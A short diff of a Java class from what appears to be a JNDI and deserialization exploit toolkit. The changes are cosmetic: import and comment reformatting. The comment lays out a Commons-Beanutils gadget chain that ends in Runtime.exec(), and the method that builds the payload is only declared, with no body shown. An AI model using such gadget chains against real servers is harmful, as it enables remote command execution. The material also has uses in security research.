@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -10,20 +9,19 @@ import org.apache.commons.beanutils.BeanComparator;
 import java.util.PriorityQueue;
 
 
-
 /**
- * 	Gadget chain:
- * 		ObjectInputStream.readObject()
- * 			PriorityQueue.readObject()
- * 				...
- * 					TransformingComparator.compare()
- * 						InvokerTransformer.transform()
- * 							Method.invoke()
- * 								Runtime.exec()
+ * Gadget chain:
+ * ObjectInputStream.readObject()
+ * PriorityQueue.readObject()
+ * ...
+ * TransformingComparator.compare()
+ * InvokerTransformer.transform()
+ * Method.invoke()
+ * Runtime.exec()
  */
 
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
-@Authors({ Authors.CCKUAILONG })
+@Authors({Authors.CCKUAILONG})
 public class CommonsBeanutils2 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
